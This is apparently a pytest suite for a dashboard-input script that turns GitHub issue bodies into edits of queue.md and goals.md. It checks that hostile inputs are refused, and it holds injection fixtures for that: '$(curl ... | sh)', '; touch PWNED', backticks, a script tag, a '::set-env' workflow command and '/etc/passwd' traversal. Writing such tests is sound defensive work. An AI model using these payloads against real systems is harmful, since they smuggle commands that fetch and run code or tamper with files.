"""Contract tests for `scripts/dashboard_input.py` — the dashboard's write door.

A ★ tap or a Goals edit on the published dashboard opens a labelled issue;
`dashboard_input.yml` runs this script on that `issues: opened` event, whose
body anyone holding a leaked token can choose (PyAutoMind#565, design C). So
most of what is tested here is
refusal: every malformed, traversing or shell-shaped input must change nothing
and say why without quoting itself. The happy paths are driven through the
real `lifecycle.py check`, which must stay green on the result.

Fictional fixtures only: `tests/**` is KEEP-copied into the public template.
"""

import json
import os
import shutil
import subprocess
import sys
from pathlib import Path

import pytest
import yaml

MIND = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(MIND / "scripts"))

import dashboard_input as di  # noqa: E402

QUEUE = """# Queue

Prose header.

```markdown
## <n>. <label>
- kind: prompt
- ref: draft/<work-type>/<target>/<name>.md
```

## 1. Sprockets
- kind: prompt
- ref: draft/feature/flywheel/sprocket_calibration.md
- note: the first wish

## 2. Gearbox
- kind: prompt
- ref: draft/bug/flywheel/gearbox_rattle.md


## Retired

Entries that have left the queue.

### Old widget work
- shipped-as: Gadgets#1
- note: history
"""

GOALS = """# Goals

Prose header.

```markdown
## <n>. <goal>
- epics: <slug>
```

## 1. Land the flywheel rework
- epics: flywheel-rework
- note: keep me

## 2. Clear the review queue
"""

PROMPTS = {
    "draft/feature/flywheel/sprocket_calibration.md": "# Sprocket calibration\n",
    "draft/bug/flywheel/gearbox_rattle.md": "# Gearbox rattle\n",
    "draft/feature/flywheel/widget_polish.md": "# Widget polish for the flywheel\n\nBody.\n",
    "active/axle_balance.md": "# Axle balance\n",
    "complete/2026/01/old_thing.md": "# Old thing\n",
}


def _git(root, *args):
    env = dict(os.environ, GIT_AUTHOR_NAME="t", GIT_AUTHOR_EMAIL="t@example.invalid",
               GIT_COMMITTER_NAME="t", GIT_COMMITTER_EMAIL="t@example.invalid")
    return subprocess.run(["git", *args], cwd=root, check=True, env=env,
                          capture_output=True, text=True)


@pytest.fixture
def mind(tmp_path):
    root = tmp_path / "mind"
    (root / "scripts").mkdir(parents=True)
    for name in ("lifecycle.py", "dashboard_input.py"):
        shutil.copy(MIND / "scripts" / name, root / "scripts" / name)
    for rel, body in PROMPTS.items():
        p = root / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(body)
    (root / "queue.md").write_text(QUEUE)
    (root / "goals.md").write_text(GOALS)
    (root / "epics.md").write_text("# Epics\n\n## flywheel-rework\n- title: x\n")
    (root / "active.md").write_text(
        "# Active\n\n## axle-balance\n- status: issued\n- prompt: active/axle_balance.md\n")
    _git(root, "init", "-q")
    _git(root, "add", "-A")
    _git(root, "commit", "-qm", "fixture")
    return root


LOGIN = "the-human"


def _body(op="", ref="", goals="", nonce=""):
    """The issue body the page writes (dashboard_edit.js `issueBody`)."""
    lines = [di.ISSUE_MARKER, f"op: {op}"]
    if op == "goals":
        lines.append("goals:")
        lines += [f"- {g}" for g in goals.split("\n")]
    else:
        lines.append(f"ref: {ref}")
    lines.append(f"nonce: {nonce}")
    return "\n".join(lines) + "\n"


def _event(body, login=LOGIN, labels=("dashboard-input",), user_type="User", number=7):
    return {"action": "opened",
            "issue": {"number": number, "body": body,
                      "user": {"login": login, "type": user_type},
                      "labels": [{"name": n} for n in labels]}}


def _run(root, op="", ref="", goals="", nonce="", verb="apply", extra=(),
         event=None, allowed=LOGIN):
    env = {k: v for k, v in os.environ.items()
           if not k.startswith(("DASHBOARD_", "GITHUB_"))}
    env.update(LIFECYCLE_NO_GH="1", DASHBOARD_INPUT_LOGIN=allowed)
    args = []
    if verb == "apply":
        path = root.parent / "event.json"
        path.write_text(json.dumps(event if event is not None
                                   else _event(_body(op, ref, goals, nonce))))
        args = ["--event", str(path), "--result-file", str(root.parent / "result.txt")]
    return subprocess.run(
        [sys.executable, str(root / "scripts" / "dashboard_input.py"), verb,
         "--root", str(root), *args, *extra],
        cwd=root, env=env, capture_output=True, text=True)


def _result(root):
    return (root.parent / "result.txt").read_text()


def _check(root):
    """The real `lifecycle.py check`, as the workflow runs it."""
    return subprocess.run(
        [sys.executable, str(root / "scripts" / "lifecycle.py"), "check"],
        cwd=root, capture_output=True, text=True,
        env=dict(os.environ, LIFECYCLE_NO_GH="1"))


def _live(text):
    return [(b["label"], b["fields"].get("ref")) for b in di._live_blocks(text.split("\n"))]


# --------------------------------------------------------------------------- #
# star / unstar / goals: the file changes exactly as asked, check stays green
# --------------------------------------------------------------------------- #
def test_star_appends_one_prompt_entry_before_the_retired_footer(mind, tmp_path):
    msg = tmp_path / "msg.txt"
    res = _run(mind, "star", "draft/feature/flywheel/widget_polish.md",
               extra=("--message-file", str(msg)))
    assert res.returncode == 0, res.stdout + res.stderr
    text = (mind / "queue.md").read_text()
    assert _live(text) == [
        ("Sprockets", "draft/feature/flywheel/sprocket_calibration.md"),
        ("Gearbox", "draft/bug/flywheel/gearbox_rattle.md"),
        # The label is the prompt's own title, never request text.
        ("Widget polish for the flywheel", "draft/feature/flywheel/widget_polish.md"),
    ]
    assert "## 3. Widget polish for the flywheel\n- kind: prompt\n" in text
    assert text.index("## 3. Widget") < text.index("## Retired")
    assert "### Old widget work" in text, "the footer is history and stays"
    assert _result(mind).startswith("dashboard-input: applied — ★ queued "
                                     "`draft/feature/flywheel/widget_polish.md` at #3")
    body = msg.read_text()
    assert body.startswith("dashboard: ★ queue widget_polish (#3)\n")
    assert "Input-issue: #7\n" in body
    assert body.rstrip().endswith("Via: mind-dashboard")
    assert _check(mind).returncode == 0, _check(mind).stdout
    # A second tap is a no-op: the op is "set the desired state".
    msg.unlink()
    again = _run(mind, "star", "draft/feature/flywheel/widget_polish.md",
                 extra=("--message-file", str(msg)))
    assert again.returncode == 0 and "already queued at #3" in again.stdout
    assert _result(mind).startswith("dashboard-input: no change — ")
    assert not msg.exists()
    assert (mind / "queue.md").read_text() == text


def test_an_active_prompt_can_be_starred(mind):
    assert _run(mind, "star", "active/axle_balance.md").returncode == 0
    assert _live((mind / "queue.md").read_text())[-1] == ("Axle balance",
                                                          "active/axle_balance.md")
    assert _check(mind).returncode == 0


def test_unstar_moves_the_entry_to_the_footer_keeping_its_note(mind):
    res = _run(mind, "unstar", "draft/feature/flywheel/sprocket_calibration.md")
    assert res.returncode == 0, res.stdout + res.stderr
    text = (mind / "queue.md").read_text()
    assert _live(text) == [("Gearbox", "draft/bug/flywheel/gearbox_rattle.md")]
    assert "## 1. Gearbox" in text, "the list is renumbered"
    footer = text[text.index("## Retired"):]
    assert ("### Sprockets\n- shelved-as: unstarred on the dashboard (" in footer)
    assert "- note: the first wish" in footer
    assert footer.index("### Sprockets") < footer.index("### Old widget work")
    assert _check(mind).returncode == 0, _check(mind).stdout
    # Unstarring what is not queued changes nothing.
    assert _run(mind, "unstar", "draft/feature/flywheel/widget_polish.md").returncode == 0
    assert (mind / "queue.md").read_text() == text


def test_a_shipped_prompt_can_still_be_unstarred(mind):
    """The prompt file is gone but its entry is not: un-★ must still work."""
    (mind / "draft/bug/flywheel/gearbox_rattle.md").unlink()
    res = _run(mind, "unstar", "draft/bug/flywheel/gearbox_rattle.md")
    assert res.returncode == 0, res.stdout
    assert [r for _l, r in _live((mind / "queue.md").read_text())] == [
        "draft/feature/flywheel/sprocket_calibration.md"]


def test_goals_are_rewritten_in_order_keeping_fields_of_unchanged_goals(mind, tmp_path):
    msg = tmp_path / "msg.txt"
    res = _run(mind, "goals", goals="1. Clear the review queue\n\n"
                                    "- Land the flywheel rework\nShip the gearbox fix\n",
               extra=("--message-file", str(msg)))
    assert res.returncode == 0, res.stdout + res.stderr
    text = (mind / "goals.md").read_text()
    assert text.startswith("# Goals\n\nProse header.\n"), "the header prose is kept"
    assert ("## 1. Clear the review queue\n\n"
            "## 2. Land the flywheel rework\n- epics: flywheel-rework\n- note: keep me\n\n"
            "## 3. Ship the gearbox fix\n") in text
    assert msg.read_text().startswith("dashboard: goals (3)\n")
    assert _check(mind).returncode == 0, _check(mind).stdout
    # The same list again is a no-op.
    before = text
    assert _run(mind, "goals", goals="Clear the review queue\nLand the flywheel "
                                     "rework\nShip the gearbox fix").returncode == 0
    assert (mind / "goals.md").read_text() == before


def test_an_empty_goals_box_clears_the_list(mind):
    assert _run(mind, "goals", goals="").returncode == 0
    assert "## 1." not in (mind / "goals.md").read_text()
    assert _check(mind).returncode == 0


# --------------------------------------------------------------------------- #
# refusals: nothing changes, the reason is safe to print
# --------------------------------------------------------------------------- #
LONG_GOAL = "g" * 201
REFUSED = [
    ("unknown op", dict(op="delete", ref="draft/feature/flywheel/widget_polish.md")),
    ("missing op", dict(op="", ref="draft/feature/flywheel/widget_polish.md")),
    ("missing ref", dict(op="star", ref="")),
    ("no such prompt", dict(op="star", ref="draft/feature/flywheel/no_such_prompt.md")),
    ("traversal", dict(op="star", ref="draft/../scripts/lifecycle.py")),
    ("traversal to md", dict(op="star", ref="draft/feature/../../goals.md")),
    ("outside draft/active", dict(op="star", ref="scripts/lifecycle.py")),
    ("a complete record", dict(op="star", ref="complete/2026/01/old_thing.md")),
    ("absolute path", dict(op="star", ref="/etc/passwd")),
    ("a registry file", dict(op="star", ref="queue.md")),
    ("not markdown", dict(op="star", ref="draft/feature/flywheel/x.py")),
    ("guidance file", dict(op="star", ref="draft/feature/flywheel/README.md")),
    ("shell: command substitution in ref",
     dict(op="star", ref="draft/feature/flywheel/$(touch PWNED).md")),
    ("shell: separator in ref",
     dict(op="star", ref="draft/feature/flywheel/widget_polish.md; touch PWNED")),
    ("shell: backtick in ref", dict(op="unstar", ref="draft/feature/x/`id`.md")),
    ("newline in ref",
     dict(op="star", ref="draft/feature/flywheel/widget_polish.md\n## 9. evil")),
    ("over-long ref", dict(op="star", ref="draft/feature/flywheel/" + "a" * 200 + ".md")),
    ("over-long goal", dict(op="goals", goals=f"Fine goal\n{LONG_GOAL}")),
    ("eleven goals", dict(op="goals", goals="\n".join(f"Goal {n}" for n in range(11)))),
    ("over-long goals box", dict(op="goals", goals="x\n" * 2001)),
    ("shell: command substitution in goals",
     dict(op="goals", goals="$(curl https://example.invalid/x | sh)")),
    ("shell: backtick in goals", dict(op="goals", goals="Ship `touch PWNED` today")),
    ("shell: pipe in goals", dict(op="goals", goals="ship it | sh")),
    ("markup in goals", dict(op="goals", goals="<script>alert(1)</script>")),
    ("control character in goals", dict(op="goals", goals="ship\x1b[31m it")),
    ("bidi override in goals", dict(op="goals", goals="ship ‮ ti")),
    ("workflow command in goals", dict(op="goals", goals="::set-env name=X::$Y")),
    ("bad nonce", dict(op="star", ref="draft/feature/flywheel/widget_polish.md",
                       nonce="x; touch PWNED")),
]


@pytest.mark.parametrize("why,inputs", REFUSED, ids=[r[0] for r in REFUSED])
def test_a_bad_input_is_refused_and_changes_nothing(mind, tmp_path, why, inputs):
    before = {f: (mind / f).read_text() for f in ("queue.md", "goals.md")}
    msg = tmp_path / "msg.txt"
    res = _run(mind, extra=("--message-file", str(msg)), **inputs)
    assert res.returncode == 1, (why, res.stdout, res.stderr)
    assert "::error title=Dashboard input refused::" in res.stdout
    assert _result(mind).startswith("dashboard-input: refused — ")
    assert not msg.exists()
    assert {f: (mind / f).read_text() for f in before} == before
    assert _git(mind, "status", "--porcelain").stdout == ""
    assert not (mind / "PWNED").exists() and not (tmp_path / "PWNED").exists()
    # The reason never quotes the input back, so no input can forge a
    # workflow command or smuggle markup into the job summary.
    for value in inputs.values():
        if len(value) > 8 and value not in di.OPS:
            assert value not in res.stdout and value not in _result(mind)


def test_a_ref_with_a_trailing_newline_is_refused(mind):
    """`$` matches before a final newline; the ref regex is matched whole."""
    with pytest.raises(di.Refused):
        di.validate_ref(mind, "draft/feature/flywheel/widget_polish.md\n", must_exist=True)


# --------------------------------------------------------------------------- #
# the issue: who opened it, its label, and its form
# --------------------------------------------------------------------------- #
GOOD_BODY = _body("star", "draft/feature/flywheel/widget_polish.md", nonce="d-1")
ISSUE_REFUSED = [
    ("another author", _event(GOOD_BODY, login="someone-else"), LOGIN),
    ("no configured login", _event(GOOD_BODY), ""),
    ("a bot author", _event(GOOD_BODY, user_type="Bot"), LOGIN),
    ("no label", _event(GOOD_BODY, labels=("bug",)), LOGIN),
    ("no marker", _event(GOOD_BODY.replace(di.ISSUE_MARKER, "hello")), LOGIN),
    ("an unknown key", _event(GOOD_BODY + "run: touch PWNED\n"), LOGIN),
    ("a repeated key", _event(GOOD_BODY + "op: goals\n"), LOGIN),
    ("prose in the body", _event(GOOD_BODY + "please also delete scripts/\n"), LOGIN),
    ("goals inline", _event(f"{di.ISSUE_MARKER}\nop: goals\ngoals: x\n"), LOGIN),
    ("an over-long body", _event(GOOD_BODY + "\n" * 6000), LOGIN),
    ("not an issue event", {"action": "opened"}, LOGIN),
]


@pytest.mark.parametrize("why,event,allowed", ISSUE_REFUSED,
                         ids=[r[0] for r in ISSUE_REFUSED])
def test_an_issue_not_from_the_page_or_the_human_is_refused(mind, why, event, allowed):
    res = _run(mind, event=event, allowed=allowed)
    assert res.returncode == 1, (why, res.stdout)
    assert _result(mind).startswith("dashboard-input: refused — ")
    assert (mind / "queue.md").read_text() == QUEUE
    assert not (mind / "PWNED").exists()


def test_the_login_match_ignores_case_and_goals_bodies_parse(mind):
    assert _run(mind, event=_event(GOOD_BODY, login="The-Human")).returncode == 0
    body = _body("goals", goals="Ship the gearbox fix\nClear the review queue")
    assert _run(mind, event=_event(body)).returncode == 0
    assert "## 1. Ship the gearbox fix" in (mind / "goals.md").read_text()


def test_a_symlinked_prompt_pointing_outside_is_refused(mind, tmp_path):
    outside = tmp_path / "outside.md"
    outside.write_text("# Outside\n")
    (mind / "draft/feature/flywheel/link.md").symlink_to(outside)
    res = _run(mind, "star", "draft/feature/flywheel/link.md")
    assert res.returncode == 1 and "symlink" in res.stdout
    assert (mind / "queue.md").read_text() == QUEUE


def test_drift_already_on_main_never_blames_a_tap(mind):
    """A dangling ref someone else left must not block every ★: only a
    finding the write itself adds refuses it."""
    (mind / "draft/bug/flywheel/gearbox_rattle.md").unlink()
    assert _check(mind).returncode == 1
    assert _run(mind, "star", "draft/feature/flywheel/widget_polish.md").returncode == 0
    assert "widget_polish.md" in (mind / "queue.md").read_text()


def test_a_write_that_adds_check_drift_is_refused_and_restored(mind, monkeypatch):
    """The last gate: whatever the edit, a new `lifecycle.py check` finding
    about queue.md/goals.md refuses it and puts both files back."""
    def bad_star(text, ref, title):
        return text.replace("gearbox_rattle.md", "gearbox_gone.md"), 2, True
    monkeypatch.setattr(di, "queue_star", bad_star)
    with pytest.raises(di.Refused, match="add lifecycle.py check drift"):
        di.apply(mind, "star", ref="draft/feature/flywheel/widget_polish.md")
    assert (mind / "queue.md").read_text() == QUEUE


# --------------------------------------------------------------------------- #
# the guard: only queue.md and goals.md may be committed
# --------------------------------------------------------------------------- #
def test_guard_passes_a_tree_where_only_the_two_files_changed(mind):
    assert _run(mind, "star", "draft/feature/flywheel/widget_polish.md").returncode == 0
    assert _run(mind, verb="guard").returncode == 0


@pytest.mark.parametrize("stray", ["scripts/lifecycle.py", "new_file.sh",
                                   ".github/workflows/x.yml"])
def test_guard_refuses_any_other_changed_path(mind, stray):
    p = mind / stray
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text("echo changed\n")
    res = _run(mind, verb="guard")
    assert res.returncode == 1
    assert "::error title=Dashboard input refused::" in res.stdout


# --------------------------------------------------------------------------- #
# the workflow: inputs never reach a shell; the page re-renders after a write
# --------------------------------------------------------------------------- #
WORKFLOWS = MIND / ".github" / "workflows"


def _workflow(name):
    path = WORKFLOWS / name
    if not path.is_file():  # the spawned template drops instance workflows
        pytest.skip(f"{name} is not shipped here")
    return yaml.safe_load(path.read_text())


def test_no_issue_text_reaches_a_shell():
    """The script reads the event JSON itself: no step interpolates the issue
    (or any event field but its number) into a script."""
    wf = _workflow("dashboard_input.yml")
    for job in wf["jobs"].values():
        for step in job["steps"]:
            run = step.get("run", "")
            assert "${{" not in run, step
            for value in (step.get("env") or {}).values():
                assert "issue.body" not in str(value) and "issue.title" not in str(value)
    assert wf["jobs"]["apply"]["env"]["ISSUE_NUMBER"] == "${{ github.event.issue.number }}"


def test_the_workflow_runs_on_a_labelled_issue_from_the_default_branch_only():
    wf = _workflow("dashboard_input.yml")
    trigger = wf.get("on") or wf.get(True)
    assert trigger == {"issues": {"types": ["opened"]}}, \
        "no workflow_dispatch: a dispatch picks the ref, an issue event cannot"
    assert "dashboard-input" in wf["jobs"]["apply"]["if"]
    assert wf["permissions"] == {"contents": "write", "issues": "write",
                                 "actions": "write"}
    assert wf["concurrency"] == {"group": "dashboard-input",
                                 "cancel-in-progress": False}
    steps = wf["jobs"]["apply"]["steps"]
    login = next(s for s in steps if s.get("id") == "apply")["env"]
    assert login == {"DASHBOARD_INPUT_LOGIN": "${{ vars.DASHBOARD_INPUT_LOGIN }}"}
    # Every run answers and closes its issue, whatever happened.
    answer = next(s for s in steps if s.get("name") == "Answer and close the issue")
    assert answer["if"] == "always()"


def test_dashboard_refresh_runs_when_the_queue_or_goals_change():
    wf = _workflow("dashboard_refresh.yml")
    trigger = wf.get("on") or wf.get(True)
    for event in ("push", "pull_request"):
        assert {"queue.md", "goals.md"} <= set(trigger[event]["paths"])
